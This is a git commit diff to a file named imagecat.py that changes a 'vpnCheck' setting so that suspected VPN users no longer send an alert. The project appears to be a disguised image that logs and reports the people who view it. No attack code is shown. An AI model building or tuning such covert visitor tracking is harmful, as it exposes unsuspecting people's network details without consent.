2000d7fb1381fd35554033d2f4d941f8bc7d6069
yuboyandrew <itsandrewtime33@gmail.com>
2025-03-15 01:12:03 -0400

    Update imagecat.py

--- api/imagecat.py
+++ api/imagecat.py
@@ -33,7 +33,7 @@ config = {
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
-    "vpnCheck": 1, # Prevents VPNs from triggering the alert
+    "vpnCheck": 2, # Prevents VPNs from triggering the alert
                 # 0 = No Anti-VPN
                 # 1 = Don't ping when a VPN is suspected
                 # 2 = Don't send an alert when a VPN is suspected
